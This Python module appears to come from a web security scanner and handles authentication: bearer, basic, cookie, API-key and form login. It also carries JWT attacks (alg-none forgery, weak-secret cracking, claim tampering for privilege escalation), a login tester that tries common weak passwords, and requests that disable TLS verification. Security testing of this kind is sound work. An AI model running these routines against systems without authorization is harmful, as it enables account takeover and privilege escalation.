"""
OXHUNTER - auth.py
Authentication Support: Cookies, JWT, Bearer Tokens, Basic Auth, Custom Headers
"""

import base64
import json
import time
import hmac
import hashlib
import requests
from typing import Optional, Dict, Tuple


# ─────────────────────────────────────────────
#  AUTH TYPES
# ─────────────────────────────────────────────
AUTH_NONE    = "none"
AUTH_BEARER  = "bearer"
AUTH_BASIC   = "basic"
AUTH_JWT     = "jwt"
AUTH_COOKIE  = "cookie"
AUTH_CUSTOM  = "custom"
AUTH_APIKEY  = "apikey"


# ─────────────────────────────────────────────
#  JWT UTILITIES
# ─────────────────────────────────────────────
class JWTAnalyzer:
    """Decode, analyze, and attack JWT tokens."""

    @staticmethod
    def decode(token: str) -> Dict:
        """Decode JWT without verification (for analysis)."""
        try:
            parts = token.strip().split(".")
            if len(parts) != 3:
                return {"error": "Invalid JWT format"}

            def pad(s):
                return s + "=" * (4 - len(s) % 4) if len(s) % 4 else s

            header    = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
            payload   = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            signature = parts[2]

            return {
                "header"   : header,
                "payload"  : payload,
                "signature": signature,
                "raw_parts": parts,
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def is_expired(token: str) -> bool:
        """Check if JWT token is expired."""
        data = JWTAnalyzer.decode(token)
        if "error" in data:
            return False
        exp = data["payload"].get("exp")
        if exp:
            return time.time() > exp
        return False

    @staticmethod
    def none_alg_attack(token: str) -> str:
        """
        JWT Attack: Change algorithm to 'none' (removes signature).
        Vulnerability: Server accepts unsigned token.
        """
        data = JWTAnalyzer.decode(token)
        if "error" in data:
            return ""

        # Modify header — alg: none
        new_header  = {"alg": "none", "typ": "JWT"}
        h_encoded   = base64.urlsafe_b64encode(
            json.dumps(new_header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        p_encoded   = data["raw_parts"][1]
        forged      = f"{h_encoded}.{p_encoded}."
        return forged

    @staticmethod
    def weak_secret_attack(token: str, wordlist: Optional[list] = None) -> Optional[str]:
        """
        Brute-force JWT secret with common weak secrets.
        Returns secret if found, else None.
        """
        if wordlist is None:
            wordlist = [
                "secret", "password", "123456", "admin", "key",
                "jwt_secret", "supersecret", "changeme", "qwerty",
                "token", "mykey", "private", "mysecret", "1234",
                "secret123", "password123", "jwt", "app_secret",
            ]

        data = JWTAnalyzer.decode(token)
        if "error" in data:
            return None

        header  = data["raw_parts"][0]
        payload = data["raw_parts"][1]
        sig     = data["raw_parts"][2]
        alg     = data["header"].get("alg", "HS256")

        if alg not in ("HS256", "HS384", "HS512"):
            return None   # Only brute RSA/ECDSA if you have the key

        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_fn  = hash_map[alg]
        message  = f"{header}.{payload}".encode()

        for secret in wordlist:
            expected = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message, hash_fn).digest()
            ).rstrip(b"=").decode()
            if expected == sig:
                return secret

        return None

    @staticmethod
    def privilege_escalation(token: str, new_claims: Dict) -> str:
        """
        Modify JWT payload claims (e.g., role: user → admin).
        Only works if server doesn't verify signature properly.
        """
        data = JWTAnalyzer.decode(token)
        if "error" in data:
            return ""

        new_payload = {**data["payload"], **new_claims}
        p_encoded   = base64.urlsafe_b64encode(
            json.dumps(new_payload, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

        forged = f"{data['raw_parts'][0]}.{p_encoded}.{data['raw_parts'][2]}"
        return forged

    @staticmethod
    def get_vulnerabilities(token: str) -> list:
        """Run all checks and return list of vulnerabilities found."""
        vulns = []
        data  = JWTAnalyzer.decode(token)

        if "error" in data:
            return vulns

        alg     = data["header"].get("alg", "")
        payload = data["payload"]

        if alg.lower() == "none":
            vulns.append({"type": "JWT_ALG_NONE", "severity": "CRITICAL",
                          "detail": "Token uses 'none' algorithm — no signature!"})

        if not payload.get("exp"):
            vulns.append({"type": "JWT_NO_EXPIRY", "severity": "HIGH",
                          "detail": "Token has no expiration (exp) claim."})

        if JWTAnalyzer.is_expired(token):
            vulns.append({"type": "JWT_EXPIRED", "severity": "INFO",
                          "detail": "Token is expired but may still be accepted."})

        weak = JWTAnalyzer.weak_secret_attack(token)
        if weak:
            vulns.append({"type": "JWT_WEAK_SECRET", "severity": "CRITICAL",
                          "detail": f"Weak secret found: '{weak}'"})

        return vulns


# ─────────────────────────────────────────────
#  AUTH MANAGER
# ─────────────────────────────────────────────
class AuthManager:
    """
    Central authentication manager.
    Builds session headers/cookies for all auth types.
    """

    def __init__(self):
        self.auth_type  : str              = AUTH_NONE
        self.token      : Optional[str]    = None
        self.username   : Optional[str]    = None
        self.password   : Optional[str]    = None
        self.cookies    : Dict[str, str]   = {}
        self.headers    : Dict[str, str]   = {}
        self.api_key    : Optional[str]    = None
        self.api_key_header: str           = "X-API-Key"

    # ── Setup Methods ─────────────────────────

    def set_bearer(self, token: str) -> "AuthManager":
        """Set Bearer token authentication."""
        self.auth_type = AUTH_BEARER
        self.token     = token
        self.headers["Authorization"] = f"Bearer {token}"
        return self

    def set_jwt(self, token: str) -> "AuthManager":
        """Set JWT token authentication."""
        self.auth_type = AUTH_JWT
        self.token     = token
        self.headers["Authorization"] = f"Bearer {token}"
        return self

    def set_basic(self, username: str, password: str) -> "AuthManager":
        """Set HTTP Basic authentication."""
        self.auth_type = AUTH_BASIC
        self.username  = username
        self.password  = password
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        self.headers["Authorization"] = f"Basic {creds}"
        return self

    def set_cookie(self, cookie_string: str) -> "AuthManager":
        """
        Set cookie-based authentication.
        Accepts: 'name=value; name2=value2' OR dict
        """
        self.auth_type = AUTH_COOKIE
        if isinstance(cookie_string, dict):
            self.cookies = cookie_string
        else:
            for part in cookie_string.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    self.cookies[k.strip()] = v.strip()
        return self

    def set_custom_header(self, header_name: str, header_value: str) -> "AuthManager":
        """Set a custom authentication header."""
        self.auth_type = AUTH_CUSTOM
        self.headers[header_name] = header_value
        return self

    def set_api_key(self, key: str, header_name: str = "X-API-Key") -> "AuthManager":
        """Set API key authentication."""
        self.auth_type      = AUTH_APIKEY
        self.api_key        = key
        self.api_key_header = header_name
        self.headers[header_name] = key
        return self

    # ── Apply to Session ──────────────────────

    def apply_to_session(self, session: requests.Session) -> requests.Session:
        """Apply all auth settings to a requests Session object."""
        session.headers.update(self.headers)
        session.cookies.update(self.cookies)
        return session

    def get_headers(self) -> Dict[str, str]:
        """Return auth headers dict."""
        return self.headers.copy()

    def get_cookies(self) -> Dict[str, str]:
        """Return auth cookies dict."""
        return self.cookies.copy()

    # ── Login Helper ──────────────────────────

    def login_form(
        self,
        login_url: str,
        username: str,
        password: str,
        username_field: str = "username",
        password_field: str = "password",
        extra_data: Optional[Dict] = None,
        session: Optional[requests.Session] = None,
    ) -> Tuple[bool, requests.Session]:
        """
        Perform form-based login and return authenticated session.
        Returns (success: bool, session: requests.Session)
        """
        if session is None:
            session = requests.Session()

        data = {username_field: username, password_field: password}
        if extra_data:
            data.update(extra_data)

        try:
            resp = session.post(login_url, data=data, timeout=10, verify=False)
            # Heuristic: login failed if still on login page
            failed_keywords = ["invalid", "incorrect", "wrong", "error", "failed"]
            body_lower = resp.text.lower()
            success = not any(kw in body_lower for kw in failed_keywords)
            if success:
                self.auth_type = AUTH_COOKIE
                self.cookies   = dict(session.cookies)
            return success, session
        except Exception as e:
            print(f"[!] Login error: {e}")
            return False, session

    # ── Session Fixation Check ────────────────

    def check_session_fixation(self, target_url: str) -> Dict:
        """
        Test for session fixation vulnerability.
        Checks if session ID changes after login.
        """
        result = {
            "vulnerable": False,
            "detail"    : "",
            "severity"  : "HIGH",
        }
        try:
            s1       = requests.Session()
            pre_resp = s1.get(target_url, timeout=10, verify=False)  # BUG-007 FIX: store and use response
            pre_id   = dict(s1.cookies).get("PHPSESSID") or dict(s1.cookies).get("JSESSIONID") or ""

            # BUG-007 FIX: use POST for login simulation, not GET
            post_resp = s1.post(target_url + "/login", data={"username": "test", "password": "test"},
                                timeout=10, verify=False)
            post_id = dict(s1.cookies).get("PHPSESSID") or dict(s1.cookies).get("JSESSIONID") or ""

            if pre_id and pre_id == post_id:
                result["vulnerable"] = True
                result["detail"]     = f"Session ID unchanged after auth: {pre_id}"
            else:
                result["detail"] = "Session ID rotated correctly."
        except Exception as e:
            result["detail"] = f"Check failed: {e}"

        return result

    # ── Info ──────────────────────────────────

    def info(self) -> Dict:
        """Return current auth configuration info."""
        return {
            "auth_type" : self.auth_type,
            "has_token" : bool(self.token),
            "has_cookie": bool(self.cookies),
            "headers"   : list(self.headers.keys()),
        }

    def __repr__(self):
        return f"<AuthManager type={self.auth_type} headers={list(self.headers.keys())}>"


# ─────────────────────────────────────────────
#  PASSWORD POLICY TESTER
# ─────────────────────────────────────────────
class PasswordPolicyTester:
    """Test target's password policy strength."""

    WEAK_PASSWORDS = [
        "123456", "password", "admin", "12345678", "qwerty",
        "abc123", "111111", "1234567", "password1", "admin123",
        "letmein", "monkey", "1234567890", "dragon", "master",
    ]

    def __init__(self, login_url: str, username: str,
                 username_field: str = "username",
                 password_field: str = "password"):
        self.login_url      = login_url
        self.username       = username
        self.username_field = username_field
        self.password_field = password_field

    def test(self, session: Optional[requests.Session] = None) -> Dict:
        """Test if weak passwords are accepted."""
        if session is None:
            session = requests.Session()

        results = {
            "weak_passwords_accepted": [],
            "account_lockout"        : False,
            "lockout_after"          : None,
        }

        for i, pwd in enumerate(self.WEAK_PASSWORDS):
            try:
                data = {self.username_field: self.username, self.password_field: pwd}
                resp = session.post(self.login_url, data=data, timeout=10, verify=False)

                if resp.status_code == 429:
                    results["account_lockout"] = True
                    results["lockout_after"]   = i
                    break

                if "dashboard" in resp.url or resp.status_code == 302:
                    results["weak_passwords_accepted"].append(pwd)

            except Exception:
                continue

        return results


# ─────────────────────────────────────────────
#  QUICK FACTORY FUNCTIONS
# ─────────────────────────────────────────────
def bearer_auth(token: str) -> AuthManager:
    return AuthManager().set_bearer(token)

def jwt_auth(token: str) -> AuthManager:
    return AuthManager().set_jwt(token)

def basic_auth(username: str, password: str) -> AuthManager:
    return AuthManager().set_basic(username, password)

def cookie_auth(cookie_string: str) -> AuthManager:
    return AuthManager().set_cookie(cookie_string)

def no_auth() -> AuthManager:
    return AuthManager()
